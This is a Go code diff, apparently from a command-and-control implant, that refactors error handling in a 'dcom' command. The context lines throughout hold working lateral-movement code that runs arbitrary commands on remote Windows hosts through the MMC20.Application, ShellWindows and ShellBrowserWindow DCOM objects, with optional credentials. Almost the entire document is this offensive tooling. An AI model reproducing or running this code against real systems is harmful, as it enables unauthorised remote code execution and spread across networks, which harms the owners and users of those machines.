@@ -105,30 +105,18 @@ func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
 	var args dcomArgs
 
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required.\nActions: exec\nObjects: mmc20, shellwindows, shellbrowser",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required.\nActions: exec\nObjects: mmc20, shellwindows, shellbrowser")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	switch strings.ToLower(args.Action) {
 	case "exec":
 		return dcomExec(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: exec", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s\nAvailable: exec", args.Action)
 	}
 }
 
@@ -205,18 +193,10 @@ func resolveCredentials(args dcomArgs) (domain, username, password string, hasEx
 
 func dcomExec(args dcomArgs) structs.CommandResult {
 	if args.Host == "" {
-		return structs.CommandResult{
-			Output:    "Error: host is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: host is required")
 	}
 	if args.Command == "" {
-		return structs.CommandResult{
-			Output:    "Error: command is required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: command is required")
 	}
 
 	object := strings.ToLower(args.Object)
@@ -232,11 +212,7 @@ func dcomExec(args dcomArgs) structs.CommandResult {
 	case "shellbrowser":
 		return dcomExecShellBrowser(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown DCOM object: %s\nAvailable: mmc20, shellwindows, shellbrowser", args.Object),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown DCOM object: %s\nAvailable: mmc20, shellwindows, shellbrowser", args.Object)
 	}
 }
 
@@ -318,11 +294,7 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 	if err != nil {
 		oleErr, ok := err.(*ole.OleError)
 		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CoInitializeEx failed: %v", err)
 		}
 	}
 	defer ole.CoUninitialize()
@@ -339,22 +311,14 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 		if !hasCreds {
 			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
 		}
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create MMC20.Application on %s: %v%s", args.Host, err, hint),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to create MMC20.Application on %s: %v%s", args.Host, err, hint)
 	}
 	defer mmc.Release()
 
 	// Get Document property
 	docResult, err := oleutil.GetProperty(mmc, "Document")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get Document: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get Document: %v", err)
 	}
 	defer docResult.Clear()
 	doc := docResult.ToIDispatch()
@@ -365,11 +329,7 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 	// Get ActiveView property
 	viewResult, err := oleutil.GetProperty(doc, "ActiveView")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get ActiveView: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get ActiveView: %v", err)
 	}
 	defer viewResult.Clear()
 	view := viewResult.ToIDispatch()
@@ -385,18 +345,10 @@ func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 	}
 	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", args.Command, dir, args.Args, "7")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ExecuteShellCommand failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("ExecuteShellCommand failed: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand%s", args.Host, args.Command, args.Args, dir, credInfo),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand%s", args.Host, args.Command, args.Args, dir, credInfo)
 }
 
 // dcomExecShellWindows executes a command via ShellWindows DCOM object.
@@ -409,11 +361,7 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	if err != nil {
 		oleErr, ok := err.(*ole.OleError)
 		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CoInitializeEx failed: %v", err)
 		}
 	}
 	defer ole.CoUninitialize()
@@ -430,22 +378,14 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 		if !hasCreds {
 			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
 		}
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create ShellWindows on %s: %v%s", args.Host, err, hint),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to create ShellWindows on %s: %v%s", args.Host, err, hint)
 	}
 	defer shellWin.Release()
 
 	// Get Item(0) — returns an Internet Explorer / Explorer window
 	itemResult, err := oleutil.CallMethod(shellWin, "Item")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get Item: %v (requires an explorer.exe shell on target)", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get Item: %v (requires an explorer.exe shell on target)", err)
 	}
 	defer itemResult.Clear()
 	item := itemResult.ToIDispatch()
@@ -456,11 +396,7 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	// Get Document
 	docResult, err := oleutil.GetProperty(item, "Document")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get Document: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get Document: %v", err)
 	}
 	defer docResult.Clear()
 	docDisp := docResult.ToIDispatch()
@@ -471,11 +407,7 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	// Get Application (returns Shell.Application)
 	appResult, err := oleutil.GetProperty(docDisp, "Application")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get Application: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get Application: %v", err)
 	}
 	defer appResult.Clear()
 	app := appResult.ToIDispatch()
@@ -490,18 +422,10 @@ func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	}
 	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("ShellExecute failed: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo)
 }
 
 // dcomExecShellBrowser executes a command via ShellBrowserWindow DCOM object.
@@ -514,11 +438,7 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 	if err != nil {
 		oleErr, ok := err.(*ole.OleError)
 		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CoInitializeEx failed: %v", err)
 		}
 	}
 	defer ole.CoUninitialize()
@@ -535,22 +455,14 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 		if !hasCreds {
 			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
 		}
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create ShellBrowserWindow on %s: %v%s", args.Host, err, hint),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to create ShellBrowserWindow on %s: %v%s", args.Host, err, hint)
 	}
 	defer browser.Release()
 
 	// Get Document
 	docResult, err := oleutil.GetProperty(browser, "Document")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get Document: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get Document: %v", err)
 	}
 	defer docResult.Clear()
 	docDisp := docResult.ToIDispatch()
@@ -561,11 +473,7 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 	// Get Application (returns Shell.Application)
 	appResult, err := oleutil.GetProperty(docDisp, "Application")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to get Application: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to get Application: %v", err)
 	}
 	defer appResult.Clear()
 	app := appResult.ToIDispatch()
@@ -580,16 +488,8 @@ func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 	}
 	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("ShellExecute failed: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo)
 }
